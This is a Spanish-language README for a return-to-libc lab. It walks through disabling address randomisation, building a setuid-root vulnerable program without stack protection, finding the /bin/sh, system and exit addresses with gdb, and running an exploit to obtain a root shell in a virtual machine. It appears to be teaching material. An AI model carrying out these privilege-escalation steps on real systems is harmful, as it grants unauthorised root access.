# return-to-libc
ataque return to libc
Requerimientos:
1.- Software de virtualizacion 
2.- Maquina virtual 

Pasos para hacer el Ataque:
1.- Arrancar el OS
      login: root
      password: root
2.- Crear un usuario
      # useradd -m -G root yeroen
      # passwd yeroen
              *deberas ingresar una contraseña*
      # exit
3.- Ingresar como usuario
      login: yeroen
      password: *contraseña ingresada*
4.- Tener los 3 documentos
      retlib.c
      getenv.c
      exploit.c
5.- Desactivamos la aleatorizacion de espacios de memoria como root
      $ su root
        password: root
      # sysctl -w kernel.randomize_va_space=0
      # gcc -fno-stack-protector -o retlib retlib.c
      # chmod 4755 retlib
      # exit
6.- Obtener las Direccione de "/bin/sh" , system y exit
      Para "/bin/sh":
            $ export MYSH=/bin/sh
            $ gcc -o getenv getenv.c
            $ ./getenv
            MYSH address is 0xb------- content /bin/sh
                *recordar esta direccion de "/bin/sh"*
      Para system y exit
            $ gdb retlib
            (gdb) b main
            (gdb) r
            (gdb) p system
            $1 = {<text variable, no debug info>} 0xb------- <system>
                *recordar esta direccion de system*
            $2 = {<text variable, no debug info>} 0xb------- <exit>
                *recordar esta direccion de exit*
            (gdb) q
            Quit anyway? (y or n) y
7.- Modificar el archivo exploit.c con las direcciones obtenidas
      $ nano exploit.c
8.- Conpilar y Ejecutar el archivo exploit.c
      $ gcc -o exploit exploit.c
      $ ./exploit
            *crea badfile*
      $ ./retlib
            *hacemos el ataque*
      #
            *y obtenemos un root shell*
